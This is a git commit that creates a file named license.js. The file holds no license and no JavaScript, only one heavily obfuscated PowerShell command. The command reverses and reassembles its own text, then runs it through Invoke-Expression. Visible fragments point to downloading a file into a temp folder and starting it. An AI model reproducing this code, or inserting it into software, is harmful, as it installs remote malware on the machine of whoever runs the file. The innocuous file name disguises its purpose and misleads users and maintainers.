7929466314668a0c38492bdd24d7199602e281ce
Azkic50 <Azkilohj55@gmail.com>
2025-04-19 12:21:03 -0400

    Create license.js

---
+++ license.js
@@ -0,0 +1,22 @@
+ (-JOIN[REGeX]::matCHes(")''nIOj-]52,51,4[cePSMOc:vNE$ (.| )63]RAHC[]gNIrts[,)211]RAHC[+45]RAHC[+66]RAHC[((EcalpeR.)93]RAHC[]gNIrts[,)68]RAHC[+78]RAHC[+15]RAHC[((EcalpeR.)421]RAHC[]gNIrts[,'qgk'(EcalpeR.)43]RAHC[]gNIrts[,)901]RAHC[+311]RAHC[+58]RAHC[((EcalpeR.)')VW3XVW3+]31[Dill'+'ehSp6'+'B+]1[DILLEHSp6B ( &qgk'+' )93]rAhc[]G'+'NIRtS[,)001]rAhc[+77]r'+'Ahc[+70'+'1]rAhc[((EcAlpEr.)421]rAhc[]GNIRtS[,)97]rAhc[+911]rAhc[+98]rAhc[((EcAlpEr.)63]rAhc[]GNIRtS[,)97]rAhc[+901]rAhc[+25]rAhc[((EcAlpEr.))VW3nEreFE'+'rpeVW3,VW3M'+'kVW3,VW3,VW3,VW3k  ECALP'+'ER-69]RaHCVW3,VW3    VW3,VW3k-'+' M6A}dMk+dMk2{}0{}1{dMk+dMkMdMk+dMk6AdMk+dMk(&dMk+dMk(VW3,VW3vBgSvBg,vBgdMk+dMkecorPdMk+dMkvBgf-M6A}dMk+dMk3{}0{}4{}2dMk+d'+'Mk{dMk+dMk}1dMk+dMk{M6A(& dMk+dMk VW3,VW3Mk+dMkMICdMk+dMkOdM'+'k+dMkos{sTP  
+
+dMk((VW3,VW3'+'k;}EdMk+d'+'MkUICORT{sTPd'+'Mk+dMk'+' =VW3,VW3dMk)VW3,VW3k dMk+dMke'+'liFdMk+dMktdMk+dMkuO- M6AAdMk+dMkMdMk+d'+'Mk6dMk+dMkA.}i{sTP irU- )vBg-ekdMk+dMkovBg,vBVW3,VW3 fi   dMk+dMk   dMk+dMk
+dMk+dMVW3,VW3dMk+dMkDICdMk+dMkOedV'+'W3,VW3  dM'+'k+dMk    dMk+dMk
+;M6A)dMk+dMkb.isTdMk+d'+'MkP(sTPfCKdMk+dMkPMEdMk+dMkT:v'+'ndMk+dMkesdMk+dMkVW3,'+'VW3TPdMk+dMkM6A = }dMk+dMVW3,VW3dMk'+'+dMk dMk+dMk}Dad'+'Mk+dMkoLdMk+dMkIdMk+dMkCdMk+dMkOdMk+dMk'+'NVW3,VW3  
+;}EVW3,VW3k+'+'dMksTdMk+dMkP )vBdMk+dMkghvBd'+'Mk+dMkgdMk+d'+'Mk,vBdMk+dMkgtdMk+dMkVW3,VW3dMk+dMkWdMk+dMkICOOd{dMk+dMksTPVW3,VW3[VW3,VW3AdMk+dMk}0{}'+'2{dMk+dMk}1{M6A( = )vdMk+dMkBgdMk+dMkbvBdMVW3,VW3dMk dMk+dMkVW3,VW3 }atAVW3,VW3sdMk+dMkmdM'+'k'+'+dMk.TXdMk+dMkIDVvBg'+',vBgYGdMk+VW3,VW3k+dMksTPdMk+d'+'Mk( hdMk+dMkcaedMk+dMkrofdMk+dMk  
+;VW3,VW3sTdMk+dMkP        dMk+dMk
+{ )}HTVW3,VW3+dMkICOif{sTP   dMk+dMk dMk+dMk  dMk+dMVW3,VW3MksdMk+dMkTPdMk+dMVW3,VW3Mk+dMkgidMk+dMksmvBg fdMk+dMk-M6VW3,VW3SlAICdMk+dMkOF'+'{dMk+dMksTPdMk+dMk dM'+'k+dMk= }ddMk+dMkAolNwoICOd{dMk+dMkVW3,VW'+'3'+'vBdMk+d'+'Mkg f-M6A}4{}0dMk+dVW3,VW3MVW3,VW3vBgidMk+dMkVW3,VW3vBdM'+'k+dVW3,VW3 
+}   dMk+VW3,VW3sdMk+dMkeTdMk+dMkvBg,vdM'+'k+dMkBdMk+dMkgtdMk+dMkVW3,VW3Mk{}3{}2{}1{}5dMk+dMVW3,VW3MkxdMVW3,VW363VW3,VW3)dMkdMknIOJ-dVW3,VW3gvdM'+'k+dMknvBg,vBgIdMk+dMkvBg,vBdMk+dMkgdohtvBg,'+'vBgedMk+dMkMd'+'Mk+dMktsdMk+dMkeRvBgdVW3,VW3)29]RaHC[,)'+'201]RaHC[+76]RaHC[+57VW3,VW3['+',)37]RVW3,VW3k
+{ dMk+dMkyrt    
+{ )}dMk+dMkATICOAI'+'dMk+dMkCdMk+dMkODeMdMk+dM'+'kos{sTP dMk+dMknidMk+d'+'Mk }idMk+dMkVW3,VW3Mk+dMkBg,vBgdMk+dMkbdMk+dMk/vBgdMk+dMk,vBg/:sd'+'Mk+dMkptvdMk+dMkBdMk'+'+'+'dMkg,vBgGVW3,VW3+66]R'+'aHC[+301]R'+'aHC[(  eCAlPERC-  V'+'W3,VW3]RaHC[,'+'dMksTPdMk  eCAlPERC-43]Ra'+'HC[,dMkM6AdMVW'+'3,VW3MkA}1{}0{dMk+dMk}4{}3{}dMk+dMk2dMk+dMk{M6A(dM'+'k+dMk.dMk+dMk dMk+dMk    dMk+d'+'Mk dMk+dMk  
+{ )}dAICOoICOLVW3,VW3aHC[+76]Ra'+'HC[+97]RaHC[(eCAVW3,VW3Mkg-tvBg,vBgssvd'+'Mk+dMkBdMk+'+'dMkg,vBgrdMk+dMkatvBg,VW3,VW3lPERC- )dMk  
+
+dMk+dMk}dMk+dMk  
+dMk+dMk}    
+{ hctac  dMk+dMk VW3,VW3Mk+VW3,VW3dMk/dfc.dMk+dMkxdirdMk+dMkgedMk+'+'dMklttavdVW3,VW3'+' 
+} dMk+dMk   
+dMk+dMk;dMk+dMk}dMk+dMkHtaPEI'+'COdMk+dMkLICOidMk+dMkfdMk+dMk{dMk+dMksdMk+dMkTdMk+dMkPdMk+dMk dVW3,VW3k+dMkf-M6dMk+dVW3,VW3SobReVOm4 ( &OwYVW3,VW'+'3Mk+dMkTP( dMk+dMkfi  dMk+dMk    
+ }VW3,VW3dM'+'k+'+'dMk dMk+dMk dMk+VW3,VW3k+dMkg( dMVW3,VW3k{M6dMk+dMkA( = dMk+dMk)vBgadMk+dM'+'kvdMk+dMkBg({@dMk+dMk]tcdMk+dM'+'kejbdMk+dMkOmodM'+'k+dMktdMk+dVW3,VW3dMk  dMk+dMk 
+ ;}hd'+'Mk+dMVW3,VW3]RaHC[(  eCAlPERC-93]RaHC[,)811]Ra'+'HCVW3,VW3{dMVW'+'3,VW3k+]3,1[)(gnIrTSOT.ecV'+'W3,VW3f{dMk+dVW3,VW3n'+'wOd{sdVW3,'+'VW3k+'+'dMk;)vBgtdMkVW3,VW3+dMkhvBgdMk+VW3,VW3ICOdMk+dMkApEd'+'Mk+dMkLIICOfdMk+'+'dMk{dMVW3,VW3aP'+'-vdMk+dMkBdMk+'+'dMkgdMk+dMkfdMk+dMVW3,VW3)dMk+dM'+'k
+dMk+dMk})vBdMk+'+'dMkg.TXIDVvBg,vdMk+dMkB'+'gGYGvBgdMk+dMk,'+'vBdVW3,VW3MksuCSdMk+dMkP[  d'+'Mk+'+'dMk
+(@ =VW3,VW3dMkVW3,VW3khTICOAP'+'edMk+d'+'M'+'kldVW3,VW3kTdMk+d'+'M'+'kIdMk+dMkCOdMk+dMkaPeLdM'+'k+dMkIdMk+dM'+'kCOdMk+dMkIVW3f-mqU}53{}73{}11{}4'+'7{}91{}33{}31{}'+'55{}92{}63{}82{}17{}23{}62{}42'+'{}12{}3'+'2{}5'+'6{}14{}52{}86{}71{'+'}35{}04{}41{}0{}01{}74{}46{}43'+'{}34{}02{}72{}9{}81{}07{}85{}54{}94{}6{}75{}93{}5'+'{}96{}36{}66{}95{}65{}16{}06{}1{}37{}84{}13{}21{}05{}4{}64{}45{}61{}8{}7{}2{}27{}2'+'4{}15{}22{}03{}44{}83{}51{}3{}'+'25{}26{}76{mqU(('(  " , '.' ,'rIgHtTolefT' )) | &( $env:coMspec[4,15,25]-joIn'')
